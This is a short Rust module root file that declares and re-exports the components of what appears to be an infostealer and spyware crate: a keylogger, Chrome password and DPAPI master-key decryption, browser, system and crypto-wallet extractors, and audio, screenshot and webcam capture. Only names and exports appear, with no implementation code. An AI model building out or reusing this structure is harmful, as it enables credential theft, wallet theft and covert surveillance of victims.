pub mod audio;
pub mod browser;
pub mod decrypt;
pub mod errors;
pub mod keylogger;
pub mod screenshot;
pub mod system;
pub mod types;
pub mod wallet;
pub mod webcam;

pub use audio::{
    record_audio, AudioConfig, AudioDevice, AudioFormat, AudioRecorder, AudioRecording,
    RecordingState,
};
pub use browser::BrowserExtractor;
pub use decrypt::{
    decrypt_chrome_password, extract_chrome_master_key, DpapiBlob, MasterKey, MasterKeyExtractor,
};
pub use errors::ExtractionError;
pub use keylogger::{
    get_key_state, KeyEvent, KeyEventType, KeyloggerConfig, KeyloggerModule, KeyloggerState,
    SpecialKey,
};
pub use screenshot::{take_screenshot, ImageFormat, Screenshot, ScreenshotConfig, ScreenshotModule};
pub use system::SystemExtractor;
pub use types::{ExtractedData, ExtractionResult, ExtractionTarget};
pub use wallet::WalletExtractor;
pub use webcam::{capture_webcam, CameraInfo, CapturedFrame, WebcamConfig, WebcamModule};
